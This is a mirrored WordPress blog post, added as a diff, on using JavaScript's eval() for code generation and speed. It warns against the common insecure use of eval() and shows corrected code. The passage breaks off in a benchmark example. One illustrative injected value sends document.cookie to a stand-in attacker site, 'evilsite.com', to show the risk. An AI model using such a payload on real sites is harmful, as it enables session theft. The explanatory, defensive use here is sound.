@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="en-GB" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#" class="no-js">
+
+<!-- Mirrored from blog.berniesumption.com/software/eval-considered-useful/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Oct 2019 12:37:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="../../xmlrpc.php">
+	<!--[if lt IE 9]>
+	<script src="/wp-content/themes/twentyfifteen/js/html5.js"></script>
+	<![endif]-->
+	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>eval() considered useful: code generation in JavaScript &#8211; Bernie Sumption&#039;s Blog</title>
+<link rel='dns-prefetch' href='http://vjs.zencdn.net/' />
+<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='http://s.w.org/' />
+<link href='https://fonts.gstatic.com/' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Bernie Sumption&#039;s Blog &raquo; Feed" href="../../feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Bernie Sumption&#039;s Blog &raquo; Comments Feed" href="../../comments/feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Bernie Sumption&#039;s Blog &raquo; eval() considered useful: code generation in JavaScript Comments Feed" href="feed/index.html" />
+<link rel='stylesheet' id='collapseomatic-css-css'  href='../../wp-content/plugins/jquery-collapse-o-matic/light_stylef24c.css?ver=1.6' type='text/css' media='all' />
+<link rel='stylesheet' id='videojs-plugin-css'  href='../../wp-content/plugins/videojs-html5-video-player-for-wordpress/plugin-styles433d.css?ver=4.9.11' type='text/css' media='all' />
+<link rel='stylesheet' id='videojs-css'  href='http://vjs.zencdn.net/4.5/video-js.css?ver=4.9.11' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-syntax-css-css'  href='../../wp-content/plugins/wp-syntax/css/wp-syntax4963.css?ver=1.1' type='text/css' media='all' />
+<link rel='stylesheet' id='chld_thm_cfg_parent-css'  href='../../wp-content/themes/twentyfifteen/style433d.css?ver=4.9.11' type='text/css' media='all' />
+<link rel='stylesheet' id='twentyfifteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Noto+Sans%3A400italic%2C700italic%2C400%2C700%7CNoto+Serif%3A400italic%2C700italic%2C400%2C700%7CInconsolata%3A400%2C700&amp;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='../../wp-content/themes/twentyfifteen/genericons/genericonscf1b.css?ver=3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='twentyfifteen-style-css'  href='../../wp-content/themes/bernie-2015-blog-theme/style433d.css?ver=4.9.11' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentyfifteen-ie-css'  href='/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010' type='text/css' media='all' />
+<![endif]-->
+<!--[if lt IE 8]>
+<link rel='stylesheet' id='twentyfifteen-ie7-css'  href='/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010' type='text/css' media='all' />
+<![endif]-->
+<script type='text/javascript' src='../../wp-content/plugins/swfobj/swfobjectdc8c.js?ver=2.2'></script>
+<script type='text/javascript' src='../../wp-includes/js/jquery/jqueryb8ff.js?ver=1.12.4'></script>
+<script type='text/javascript' src='../../wp-includes/js/jquery/jquery-migrate.min330a.js?ver=1.4.1'></script>
+<script type='text/javascript' src='../../wp-content/plugins/wp-hide-post/public/js/wp-hide-post-public6471.js?ver=2.0.10'></script>
+<link rel='https://api.w.org/' href='../../wp-json/index.html' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../xmlrpc0db0.php?rsd" />
+<link rel='prev' title='Animator.js: JavaScript animation library' href='../animator/index.html' />
+<link rel='next' title='The inamo mouse system: a hacktastic story' href='../inamo-mouse-system-multiple-mouse-pointers-in-flash/index.html' />
+<meta name="generator" content="WordPress 4.9.11" />
+<link rel="canonical" href="index.html" />
+<link rel='shortlink' href='../../index0345.html?p=22' />
+<link rel="alternate" type="application/json+oembed" href="../../wp-json/oembed/1.0/embedeeca.json?url=https%3A%2F%2Fblog.berniesumption.com%2Fsoftware%2Feval-considered-useful%2F" />
+<link rel="alternate" type="text/xml+oembed" href="../../wp-json/oembed/1.0/embed24e2?url=https%3A%2F%2Fblog.berniesumption.com%2Fsoftware%2Feval-considered-useful%2F&amp;format=xml" />
+
+		<script type="text/javascript"> document.createElement("video");document.createElement("audio");document.createElement("track"); </script>
+				<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css">.broken_link, a.broken_link {
+	text-decoration: line-through;
+}</style><!-- BEGIN GADWP v5.1.2.5 Universal Analytics - https://deconf.com/google-analytics-dashboard-wordpress/ -->
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-19810778-2', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- END GADWP Universal Analytics -->
+
+<!-- START - Facebook Open Graph, Google+ and Twitter Card Tags 2.1.3 -->
+ <!-- Facebook Open Graph -->
+  <meta property="og:locale" content="en_GB"/>
+  <meta property="og:site_name" content="Bernie Sumption&#039;s Blog"/>
+  <meta property="og:title" content="eval() considered useful: code generation in JavaScript"/>
+  <meta property="og:url" content="https://blog.berniesumption.com/software/eval-considered-useful/"/>
+  <meta property="og:type" content="article"/>
+  <meta property="og:description" content="If ever a feature of JavaScript was considered harmful, it&#039;s eval(). It&#039;s so commonly abused that if I&#039;m interviewing a JS web developer, I usually ask something along the lines of &quot;what is eval(), and why shouldn&#039;t you use it&quot;. It&#039;s so commonly abused that Yahoo JavaScript architect Douglas Cronkfo"/>
+  <meta property="article:published_time" content="2010-09-30T05:09:29+00:00"/>
+  <meta property="article:modified_time" content="2019-10-17T08:06:40+00:00" />
+  <meta property="og:updated_time" content="2019-10-17T08:06:40+00:00" />
+  <meta property="article:section" content="Software"/>
+ <!-- Google+ / Schema.org -->
+  <meta itemprop="name" content="eval() considered useful: code generation in JavaScript"/>
+  <meta itemprop="description" content="If ever a feature of JavaScript was considered harmful, it&#039;s eval(). It&#039;s so commonly abused that if I&#039;m interviewing a JS web developer, I usually ask something along the lines of &quot;what is eval(), and why shouldn&#039;t you use it&quot;. It&#039;s so commonly abused that Yahoo JavaScript architect Douglas Cronkfo"/>
+ <!-- Twitter Cards -->
+  <meta name="twitter:title" content="eval() considered useful: code generation in JavaScript"/>
+  <meta name="twitter:url" content="https://blog.berniesumption.com/software/eval-considered-useful/"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+ <!-- SEO -->
+  <meta name="description" content="If ever a feature of JavaScript was considered harmful, it&#039;s eval(). It&#039;s so commonly abused that if I&#039;m interviewing a JS web developer, I usually ask something along the lines of &quot;what is eval(), and why shouldn&#039;t you use it&quot;. It&#039;s so commonly abused that Yahoo JavaScript architect Douglas Cronkfo"/>
+ <!-- Misc. tags -->
+<!-- END - Facebook Open Graph, Google+ and Twitter Card Tags 2.1.3 -->
+	
+</head>
+
+<body class="post-template-default single single-post postid-22 single-format-standard">
+<div id="page" class="hfeed site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	<div id="sidebar" class="sidebar">
+		<header id="masthead" class="site-header" role="banner">
+			<div class="site-branding">
+										<p class="site-title"><a href="../../index.html" rel="home">Bernie Sumption&#039;s Blog</a></p>
+											<p class="site-description">Various writings on software development and photography</p>
+									<button class="secondary-toggle">Menu and widgets</button>
+			</div><!-- .site-branding -->
+		</header><!-- .site-header -->
+
+			<div id="secondary" class="secondary">
+
+		
+		
+					<div id="widget-area" class="widget-area" role="complementary">
+				<aside id="categories-2" class="widget widget_categories"><h2 class="widget-title">Categories</h2>		<ul>
+	<li class="cat-item cat-item-7"><a href="../../category/photography/index.html" >Photography</a> (12)
+</li>
+	<li class="cat-item cat-item-1"><a href="../../category/software/index.html" >Software</a> (29)
+<ul class='children'>
+	<li class="cat-item cat-item-14"><a href="../../category/software/dnartwork/index.html" >DNArtwork</a> (8)
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-8"><a href="../../category/urandom/index.html" >urandom</a> (1)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
+											<li>
+					<a href="../building-reliable-user-interfaces/index.html">Strategies for building reliable user interfaces</a>
+									</li>
+											<li>
+					<a href="../dnartwork/dnartwork-generating-realistic-painted-shapes/index.html">Making DNArtwork #8: Generating realistic painted shapes on-demand</a>
+									</li>
+											<li>
+					<a href="../dnartwork/index.html">Project: DNArtwork</a>
+									</li>
+											<li>
+					<a href="../dnartwork/dnartwork-how-it-works/index.html">Making DNArtwork #7: how does it work?</a>
+									</li>
+											<li>
+					<a href="../dnartwork/dnartwork-first-art-print/index.html">Making DNArtwork #6: the first art print, hot off the press</a>
+									</li>
+					</ul>
+		</aside><aside id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2>		<ul>
+			<li><a href='../../2017/09/index.html'>September 2017</a></li>
+	<li><a href='../../2016/12/index.html'>December 2016</a></li>
+	<li><a href='../../2016/09/index.html'>September 2016</a></li>
+	<li><a href='../../2016/07/index.html'>July 2016</a></li>
+	<li><a href='../../2016/06/index.html'>June 2016</a></li>
+	<li><a href='../../2015/11/index.html'>November 2015</a></li>
+	<li><a href='../../2015/10/index.html'>October 2015</a></li>
+	<li><a href='../../2015/04/index.html'>April 2015</a></li>
+	<li><a href='../../2015/03/index.html'>March 2015</a></li>
+	<li><a href='../../2015/02/index.html'>February 2015</a></li>
+	<li><a href='../../2015/01/index.html'>January 2015</a></li>
+	<li><a href='../../2011/10/index.html'>October 2011</a></li>
+	<li><a href='../../2011/05/index.html'>May 2011</a></li>
+	<li><a href='../../2011/04/index.html'>April 2011</a></li>
+	<li><a href='../../2010/11/index.html'>November 2010</a></li>
+	<li><a href='../../2010/10/index.html'>October 2010</a></li>
+	<li><a href='../../2010/09/index.html'>September 2010</a></li>
+	<li><a href='../../2008/04/index.html'>April 2008</a></li>
+	<li><a href='../../2007/11/index.html'>November 2007</a></li>
+	<li><a href='../../2007/03/index.html'>March 2007</a></li>
+		</ul>
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">bernie</span> on <a href="../daphnes-tweeting-catflap/index.html#comment-24406">Daphne&#8217;s tweeting catflap</a></li><li class="recentcomments"><span class="comment-author-link">Nick Battle</span> on <a href="../daphnes-tweeting-catflap/index.html#comment-24404">Daphne&#8217;s tweeting catflap</a></li><li class="recentcomments"><span class="comment-author-link">bernie</span> on <a href="../on-abandoning-gulp/index.html#comment-23795">On abandoning Gulp</a></li><li class="recentcomments"><span class="comment-author-link">NotAScriptKiddy</span> on <a href="../on-abandoning-gulp/index.html#comment-23794">On abandoning Gulp</a></li><li class="recentcomments"><span class="comment-author-link"><a href='https://www.flickr.com/photos/judeapollo' rel='external nofollow' class='url'>Rory Melough</a></span> on <a href="../../photography/depth-of-field-for-geeks/index.html#comment-21881">Bernie&#8217;s Better Guide to Depth of Field for Geeks Who Want to be Digital Artists</a></li></ul></aside>			</div><!-- .widget-area -->
+		
+	</div><!-- .secondary -->
+
+	</div><!-- .sidebar -->
+
+	<div id="content" class="site-content">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+<article id="post-22" class="post-22 post type-post status-publish format-standard hentry category-software">
+	
+	<header class="entry-header">
+		<h1 class="entry-title">eval() considered useful: code generation in JavaScript</h1>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p>If ever a feature of JavaScript was considered harmful, it&#8217;s <code>eval()</code>. It&#8217;s so commonly abused that if I&#8217;m interviewing a JS web developer, I usually ask something along the lines of &#8220;what is <code>eval()</code>, and why shouldn&#8217;t you use it&#8221;. It&#8217;s so commonly abused that Yahoo JavaScript architect Douglas Cronkford considers it &#8220;evil&#8221;, and his JavaScript style checker <a href="http://www.jslint.com/">JSLint</a> reports use of it as an error.</p>
+<p>People dislike <code>eval()</code> because it&#8217;s perceived to be slow and insecure. In this article I describe a way to use <code>eval()</code> to make your application <i>faster</i>.</p>
+<p><span id="more-22"></span></p>
+<p><span style="text-decoration: underline;">Watch out!</span> This is a black belt technique. Rasmus Lerdorf, the creator of PHP, once wrote that <i>&#8220;if eval() is the answer, you&#8217;re almost certainly asking the wrong question&#8221;</i>. Use it as a last resort when other optimisations have failed. Or to show off.</p>
+<p><em>Edited in 2015 to add: modern browsers are all very fast at executing JavaScript. Some of that speed comes through optimisations like the one described in this article, done automatically for you. This hack is therefore no longer necessary.</em></p>
+<h2>Burn the witch!</h2>
+<p>Dislike of <code>eval()</code> stems almost entirely from the commonly seen schoolboy error of using <code>eval()</code> whenever you need to access a variable whose name is stored in another variable:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// incorrect way of setting a member variable:</span>
+eval<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;myObject.&quot;</span> <span style="color: #339933;">+</span> varName <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot; = 'new value'&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #006600; font-style: italic;">// the schoolboy should have done this:</span>
+myObject<span style="color: #009900;">&#91;</span>varName<span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #3366CC;">'new value'</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">// incorrect way of setting a member variable:
+eval(&quot;myObject.&quot; + varName + &quot; = 'new value'&quot;);
+
+// the schoolboy should have done this:
+myObject[varName] = 'new value';</p></div>
+
+<p>Not only is the first version 20 times slower (tested on Firefox), but it is also an invitation to code execution attacks. Imagine what would happen if an attacker managed to set varName to this:</p>
+<p><code>foo='new value';window.i = new Image(); i.src = 'http://evilsite.com/" + track.php?cookie=' + escape(document.cookie);//</code></p>
+<p>Yup, that would set <code>myObject.foo</code> to &#8216;new value&#8217;, then create a new image, loaded from the attacker&#8217;s site. The image is served from a script that records the cookie passed to it. If the script is clever, it will return a valid image so that no errors are produced, and nobody is the wiser. If your web application doesn&#8217;t tie a session to a single IP address (like most PHP applications for example), the attacker can now extract your session ID from the cookie and log in as you. Ouch.</p>
+<p>In fact, it&#8217;s not just beginners that fall for this. This is a real example collected from an old tutorial on the respected (by me at least) site <a href="http://www.codeproject.com/">The Code Project</a>:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// this function is supposed to take a string class name, create an</span>
+<span style="color: #006600; font-style: italic;">// instance of that class, and copy all of the members of the new</span>
+<span style="color: #006600; font-style: italic;">// instance into a dictionary. ${DEITY} knows why you'd want to do</span>
+<span style="color: #006600; font-style: italic;">// that, but that's not the point of this sample</span>
+&nbsp;
+<span style="color: #006600; font-style: italic;">// incorrect way of accessing members:</span>
+<span style="color: #000066; font-weight: bold;">function</span> CreateCollection<span style="color: #009900;">&#40;</span>ClassName<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> obj<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> <span style="">Array</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    eval<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;var t=new &quot;</span><span style="color: #339933;">+</span>ClassName<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;()&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">for</span><span style="color: #009900;">&#40;</span>_item <span style="color: #000066; font-weight: bold;">in</span> t<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        eval<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;obj.&quot;</span><span style="color: #339933;">+</span>_item<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;=t.&quot;</span><span style="color: #339933;">+</span>_item<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+    <span style="color: #000066; font-weight: bold;">return</span> obj<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #006600; font-style: italic;">// the above function should read:</span>
+<span style="color: #000066; font-weight: bold;">function</span> CreateCollection<span style="color: #009900;">&#40;</span>ClassName<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> obj <span style="color: #339933;">=</span> <span style="color: #009900;">&#123;</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> _item<span style="color: #339933;">,</span> t <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> window<span style="color: #009900;">&#91;</span>ClassName<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">for</span><span style="color: #009900;">&#40;</span>_item <span style="color: #000066; font-weight: bold;">in</span> t<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        obj<span style="color: #009900;">&#91;</span>_item<span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span> t<span style="color: #009900;">&#91;</span>_item<span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+    <span style="color: #000066; font-weight: bold;">return</span> obj<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">// this function is supposed to take a string class name, create an
+// instance of that class, and copy all of the members of the new
+// instance into a dictionary. ${DEITY} knows why you'd want to do
+// that, but that's not the point of this sample
+
+// incorrect way of accessing members:
+function CreateCollection(ClassName) {
+    var obj=new Array();
+    eval(&quot;var t=new &quot;+ClassName+&quot;()&quot;);
+    for(_item in t) {
+        eval(&quot;obj.&quot;+_item+&quot;=t.&quot;+_item);
+    }
+    return obj;
+}
+
+// the above function should read:
+function CreateCollection(ClassName) {
+    var obj = {}, _item, t = new window[ClassName]();
+    for(_item in t) {
+        obj[_item] = t[_item];
+    }
+    return obj;
+}</p></div>
+
+<h3>Unless the witch {is: &#8220;made&#8221;, of: &#8220;JSON&#8221;}!</h3>
+<p>With the growing popularity of <a href="http://www.json.org/js.html">JSON</a>, poor little eval has finally become respected. It might be slow compared to square[bracket] member access, but since JSON is actually JavaScript code, it&#8217;s <b>much</b> faster to parse JSON using eval than it is to parse XML using the DOM.</p>
+<p>But there is another way that <code>eval()</code> can speed up your application&#8230;</p>
+<h2>Metaprogramming: a contrived example</h2>
+<p>JavaScript is a dynamic language and some things are just slow, in particular, function calls and <code>for(x in y)</code> loops. &#8220;Slow&#8221; is relative here &#8211; we&#8217;re talking microseconds, but these things can really add up if you&#8217;re doing them inside a loop that runs a few thousand times. This is a pity, because functions and loops help you write generic code that can be reused in other situations.</p>
+<p>The problem is made worse when you consider that JavaScript only has one thread, so if a script spends a second calculating something, the whole UI will freeze up for a second &#8211; no buttons can be clicked or keystrokes typed.</p>
+<p>Let&#8217;s say you want to create a kind of class called a Multiplier. This class is constructed with a data object and a coefficient number. The data object is stored in a public variable, and every time the <code>multiply()</code> method is called, every number anywhere in the data object is multiplied by the coefficient. For example:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #000066; font-weight: bold;">var</span> mul <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> Multiplier<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#123;</span>a<span style="color: #339933;">:</span><span style="color: #CC0000;">10</span><span style="color: #339933;">,</span> subObject<span style="color: #339933;">:</span><span style="color: #009900;">&#123;</span>b<span style="color: #339933;">:</span> <span style="color: #CC0000;">11</span><span style="color: #339933;">,</span> c<span style="color: #339933;">:</span><span style="color: #3366CC;">&quot;foo&quot;</span><span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #006600; font-style: italic;">// mul.data == {a:10, subObject:{b: 11, c:&quot;foo&quot;}}</span>
+mul.<span style="color: #660066;">multiply</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #006600; font-style: italic;">// mul.data == {a:20, subObject:{b: 22, c:&quot;foo&quot;}}</span>
+mul.<span style="color: #660066;">multiply</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #006600; font-style: italic;">// mul.data == {a:40, subObject:{b: 44, c:&quot;foo&quot;}}</span></pre></td></tr></table><p class="theCode" style="display:none;">var mul = new Multiplier({a:10, subObject:{b: 11, c:&quot;foo&quot;}}, 2);
+// mul.data == {a:10, subObject:{b: 11, c:&quot;foo&quot;}}
+mul.multiply();
+// mul.data == {a:20, subObject:{b: 22, c:&quot;foo&quot;}}
+mul.multiply();
+// mul.data == {a:40, subObject:{b: 44, c:&quot;foo&quot;}}</p></div>
+
+<p>As I said, it&#8217;s a contrived example, but the pattern behind it is common: you have to do something to an object, but you don&#8217;t know the structure of the object in advance.</p>
+<p>It&#8217;s easy to implement. Here&#8217;s one possible obvious implementation:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// this Multiplier uses reflection - i.e. for (x in y) - to</span>
+<span style="color: #006600; font-style: italic;">// traverse the data object</span>
+<span style="color: #000066; font-weight: bold;">function</span> ReflectingMultiplier<span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> coefficient<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span> <span style="color: #339933;">=</span> data<span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">coefficient</span> <span style="color: #339933;">=</span> coefficient<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+ReflectingMultiplier.<span style="color: #000066; font-weight: bold;">prototype</span>.<span style="color: #660066;">multiply</span> <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>._multiply<span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+ReflectingMultiplier.<span style="color: #000066; font-weight: bold;">prototype</span>._multiply <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> prop<span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span>prop <span style="color: #000066; font-weight: bold;">in</span> data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        <span style="color: #000066; font-weight: bold;">switch</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span> data<span style="color: #009900;">&#91;</span>prop<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+            <span style="color: #000066; font-weight: bold;">case</span> <span style="color: #3366CC;">&quot;number&quot;</span><span style="color: #339933;">:</span>
+                data<span style="color: #009900;">&#91;</span>prop<span style="color: #009900;">&#93;</span> <span style="color: #339933;">*=</span> <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">coefficient</span><span style="color: #339933;">;</span>
+                <span style="color: #000066; font-weight: bold;">break</span><span style="color: #339933;">;</span>
+            <span style="color: #000066; font-weight: bold;">case</span> <span style="color: #3366CC;">&quot;object&quot;</span><span style="color: #339933;">:</span>
+                <span style="color: #000066; font-weight: bold;">this</span>._multiply<span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#91;</span>prop<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+                <span style="color: #000066; font-weight: bold;">break</span><span style="color: #339933;">;</span>
+        <span style="color: #009900;">&#125;</span>
+    <span style="color: #009900;">&#125;</span>
+<span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">// this Multiplier uses reflection - i.e. for (x in y) - to
+// traverse the data object
+function ReflectingMultiplier(data, coefficient) {
+    this.data = data;
+    this.coefficient = coefficient;
+}
+ReflectingMultiplier.prototype.multiply = function() {
+    this._multiply(this.data);
+}
+ReflectingMultiplier.prototype._multiply = function(data) {
+    var prop;
+    for (prop in data) {
+        switch (typeof data[prop]) {
+            case &quot;number&quot;:
+                data[prop] *= this.coefficient;
+                break;
+            case &quot;object&quot;:
+                this._multiply(data[prop]);
+                break;
+        }
+    }
+}</p></div>
+
+<p>The problem with the above is that it&#8217;s slow. In order to carry out two multiplication operations, each of which are extremely quick, you use two function calls and two <code>for</code> loops.</p>
+<h3>Performance test</h3>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// ReflectingMultiplier test code:  calculate the average time taken</span>
+<span style="color: #006600; font-style: italic;">// to call multiply()</span>
+<span style="color: #000066; font-weight: bold;">var</span> TIMES <span style="color: #339933;">=</span> <span style="color: #CC0000;">100000</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> obj <span style="color: #339933;">=</span> <span style="color: #009900;">&#123;</span>a<span style="color: #339933;">:</span><span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> b<span style="color: #339933;">:</span><span style="color: #009900;">&#123;</span>foo<span style="color: #339933;">:</span><span style="color: #CC0000;">2</span><span style="color: #339933;">,</span> bar<span style="color: #339933;">:</span><span style="color: #CC0000;">4</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> c<span style="color: #339933;">:</span><span style="color: #009900;">&#123;</span>quux<span style="color: #339933;">:</span><span style="color: #CC0000;">5</span><span style="color: #339933;">,</span> blarty<span style="color: #339933;">:</span><span style="color: #CC0000;">6</span><span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> mul <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> ReflectingMultiplier<span style="color: #009900;">&#40;</span>obj<span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> start <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">for</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span>TIMES<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    mul.<span style="color: #660066;">multiply</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+<span style="color: #000066; font-weight: bold;">var</span> end <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> time <span style="color: #339933;">=</span> end.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">-</span> start.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+alert<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">1000</span> <span style="color: #339933;">*</span> time <span style="color: #339933;">/</span> TIMES<span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot; microseconds average&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">// ReflectingMultiplier test code:  calculate the average time taken
+// to call multiply()
+var TIMES = 100000;
